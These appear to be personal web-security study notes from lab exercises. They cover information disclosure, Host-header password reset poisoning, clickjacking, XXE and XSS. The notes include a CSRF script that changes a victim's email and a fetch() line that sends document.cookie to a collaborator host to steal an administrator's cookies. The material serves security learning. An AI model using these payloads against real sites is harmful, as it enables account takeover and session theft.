### Information disclosure
- In php websites, debug file with the output of phpinfo() is `/cgi-bin/phpinfo.php`
- Look for backups: /backup folder or: `file.ext~, #file.ext#, ~file.ext, file.ext.bak, file.ext.tmp, file.ext.old, file.bak, file.tmp and file.old`
- Look for robots.txt or sitemap.xml
- The `TRACE` `HTTP request` method is primarily used for diagnostic purposes. It echoes back the received request so that the client can see what changes or additions might have been made by intermediate servers.
    - Useful to determine if additional headers were appended by proxy servers.
- CHECK VERSION CONTROL: see if there is a .git folder on the server, and if there is extract it with `git-dumper`

```javascript
<script>
var ref = new XMLHttpRequest();
ref.open('post', 'https://0a3c00de0493af8582f1f131005b00dd.web-security-academy.net/my-account/change-email', true);
ref.withCredentials = true;
ref.send('email=test@ahdyue.net');
</script>
```
- Some applications trust the HOST header **TOO MUCH**
    - -> password reset poisoning: forgot-password link generated dynamically based on the HOST header address -> change host header to an attacker controlled website -> when the user clicks the "password-reset link" it will appear with the reset token in the attacker's logs so that it can use it on the real vulnerable app
    - -> HOST header to allow admin to localhost!!!

### Clickjacking
- create 2 layers: decoy website + target website
- decoy website is put behind target website, and target website is put with opactiy 0.00001 = transparent 
- the user only sees the decoy website, that is actually behind the real interface of the target. If you put buttons aligned on decoy with target, when they "click" on the decoy button -> it actually clicks the layer 1, which is the target without them knowing !!!
- PREVENTION: `frame-busters!!!` scripts that don't allow the website to be framed inside an iframe -> makes elements visible, takes over top-window, doesn't allow actions on invisible elements!

### XXE - XML external entity injection
- view files on filesystem of server + interact with backend systems

### Essential skills
- scan a specific insertion point
- if you find XSS with OAST technique, send over the cookies of the administrator (stored XSS)
- in JS, you have 2 functions for `normalizing the cookies`
    - `encodeURI` - leaves `=`,`&` and `?` intact since they have a meaning in the URI
    - `encodeURIComponent` - encodes ALL in order for it to be processed as a URL component
- STRING INTERPOLATION IN JAVASCRIPT
    - x = `Hello ${x}`
- ex: fetch('http://collaborator/${encodeURIComponent(document.cookie)}')